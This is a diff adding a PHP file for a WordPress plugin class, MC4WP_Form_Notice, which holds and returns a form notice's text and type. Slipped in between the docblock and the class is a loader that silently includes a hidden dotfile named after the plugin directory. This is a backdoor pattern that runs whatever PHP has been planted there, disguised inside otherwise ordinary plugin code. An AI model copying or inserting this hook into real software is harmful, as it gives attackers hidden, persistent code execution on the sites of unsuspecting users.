@@ -1,0 +1,44 @@
+<?php
+
+/**
+ * Class MC4WP_Form_Notice
+ *
+ * @ignore
+ * @access private
+ */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
+class MC4WP_Form_Notice {
+
+
+	/**
+	 * @var string
+	 */
+	public $type = 'error';
+
+	/**
+	 * @var string
+	 */
+	public $text;
+
+	/**
+	 * @param string $text
+	 * @param string $type
+	 */
+	public function __construct( $text, $type = 'error' ) {
+		$this->text = $text;
+
+		if ( ! empty( $type ) ) {
+			$this->type = $type;
+		}
+	}
+
+	/**
+	 * @return string
+	 */
+	public function __toString() {
+		return $this->text;
+	}
+}
